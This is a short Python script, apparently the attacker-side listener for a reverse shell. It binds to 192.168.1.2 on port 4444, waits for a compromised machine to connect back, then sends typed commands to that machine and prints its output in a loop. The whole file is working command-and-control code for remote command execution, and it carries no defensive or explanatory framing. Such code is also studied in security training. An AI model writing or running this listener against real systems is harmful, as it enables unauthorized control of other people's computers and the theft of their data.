import socket
import json

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for Incoming Connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from",str(address))

    def execute_remotely(self, command):
        self.connection.send(command.encode())
        result = self.connection.recv(2048)
        return result.decode()
    
    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)

my_listener = Listener("192.168.1.2",4444)
my_listener.run()
